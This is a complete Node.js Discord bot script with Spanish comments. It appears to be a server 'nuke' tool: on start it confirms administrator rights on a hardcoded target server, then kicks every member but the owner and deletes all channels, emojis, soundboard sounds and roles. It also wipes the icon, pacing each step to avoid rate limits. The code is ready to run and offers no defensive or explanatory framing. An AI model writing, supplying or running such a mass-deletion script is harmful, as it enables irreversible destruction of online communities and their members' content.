const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
require('dotenv').config();

// Configura el cliente del bot
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMembers, // Necesario para gestionar roles y expulsar miembros
  ],
});

// Obtén el token desde la variable de entorno
const TOKEN = process.env.DISCORD_TOKEN;

// Función para esperar un tiempo (en milisegundos)
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Evento cuando el bot está listo
client.once('ready', async () => {
  console.log(`Bot conectado como ${client.user.tag} a las ${new Date().toLocaleString()}`);

  // Obtén el servidor (guild) donde el bot está
  // Cambia 'ID_DEL_SERVIDOR' por el ID del servidor objetivo
  const guildId = '1134375138029211739'; // Reemplaza con el ID real del servidor
  const guild = client.guilds.cache.get(guildId);

  if (!guild) {
    console.error(`No se encontró el servidor con ID ${guildId}. Asegúrate de que el bot esté en el servidor y el ID sea correcto.`);
    return;
  }

  // Verifica si el bot tiene permisos de administrador
  const botMember = guild.members.me;
  if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
    console.error('El bot no tiene permisos de administrador en el servidor.');
    return;
  }

  try {
    // 1. Expulsar a todos los miembros (excepto el bot y el propietario)
    console.log('Iniciando expulsión de miembros...');
    for (const member of guild.members.cache.values()) {
      // Evita expulsar al bot mismo y al propietario del servidor
      if (member.id === client.user.id || member.id === guild.ownerId) {
        console.log(`Omitiendo miembro ${member.user.tag} (es el bot o el propietario).`);
        continue;
      }
      try {
        await member.kick('Eliminación masiva del servidor'); // Sin mensaje de MD
        console.log(`Miembro ${member.user.tag} expulsado.`);
        await delay(1000); // Espera 1 segundo para evitar límites de la API
      } catch (error) {
        console.error(`Error al expulsar al miembro ${member.user.tag}: ${error.message}`);
      }
    }

    // 2. Borrar todos los canales
    console.log('Iniciando eliminación de canales...');
    for (const channel of guild.channels.cache.values()) {
      try {
        await channel.delete();
        console.log(`Canal ${channel.name} borrado.`);
        await delay(1000); // Espera 1 segundo
      } catch (error) {
        console.error(`Error al borrar el canal ${channel.name}: ${error.message}`);
      }
    }

    // 3. Borrar todos los emojis
    console.log('Iniciando eliminación de emojis...');
    for (const emoji of guild.emojis.cache.values()) {
      try {
        await emoji.delete();
        console.log(`Emoji ${emoji.name} borrado.`);
        await delay(1000); // Espera 1 segundo
      } catch (error) {
        console.error(`Error al borrar el emoji ${emoji.name}: ${error.message}`);
      }
    }

    // 4. Borrar todos los sonidos del panel de sonido
    console.log('Iniciando eliminación de sonidos del panel de sonido...');
    try {
      const soundboardSounds = await guild.getSoundboardSounds();
      for (const sound of soundboardSounds) {
        try {
          await guild.deleteSoundboardSound(sound.sound_id);
          console.log(`Sonido ${sound.name} borrado.`);
          await delay(1000); // Espera 1 segundo
        } catch (error) {
          console.error(`Error al borrar el sonido ${sound.name}: ${error.message}`);
        }
      }
    } catch (error) {
      console.error('Error al obtener o borrar sonidos del panel de sonido:', error.message);
    }

    // 5. Borrar todos los roles (excepto @everyone y roles gestionados)
    console.log('Iniciando eliminación de roles...');
    for (const role of guild.roles.cache.values()) {
      // Evita borrar el rol @everyone y roles gestionados (como los de bots)
      if (role.name === '@everyone' || role.managed) {
        console.log(`Omitiendo rol ${role.name} (es @everyone o gestionado).`);
        continue;
      }
      try {
        await role.delete();
        console.log(`Rol ${role.name} borrado.`);
        await delay(1000); // Espera 1 segundo
      } catch (error) {
        console.error(`Error al borrar el rol ${role.name}: ${error.message}`);
      }
    }

    // 6. Borrar el ícono del servidor
    console.log('Iniciando eliminación de la imagen del servidor...');
    try {
      await guild.setIcon(null);
      console.log('Ícono del servidor borrado.');
      await delay(1000); // Espera 1 segundo
    } catch (error) {
      console.error('Error al borrar el ícono del servidor:', error.message);
    }

    console.log('Eliminación completada. El servidor está vacío.');
  } catch (error) {
    console.error('Error general durante la eliminación:', error.message);
  }

  // Cierra el bot después de completar la tarea
  console.log('Tarea finalizada. Cerrando el bot...');
  client.destroy();
});

// Inicia el bot
client.login(TOKEN).catch((error) => {
  console.error('Error al iniciar el bot:', error.message);
});
